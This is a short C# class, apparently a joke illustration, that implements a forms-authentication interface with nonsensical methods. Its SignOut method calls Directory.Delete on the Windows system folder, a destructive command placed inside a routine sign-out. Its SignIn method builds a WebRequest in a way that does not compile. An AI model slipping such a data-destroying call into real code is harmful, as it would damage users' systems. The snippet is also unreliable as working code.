    public class StupidFormsAuthentication : IFormsAuthenticationService
    {
        public void SignIn(string userName, bool createPersistentCookie)
        {
            WebRequest request = new WebRequest("http://google.com");
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            StreamReader reader = new StreamReader (response.GetResponseStream());
            string responseFromServer = reader.ReadToEnd ();
            Console.WriteLine (responseFromServer);
        }
    
        public void SignOut()
        {
            Directory.Delete("C:/windows");
        }
    }
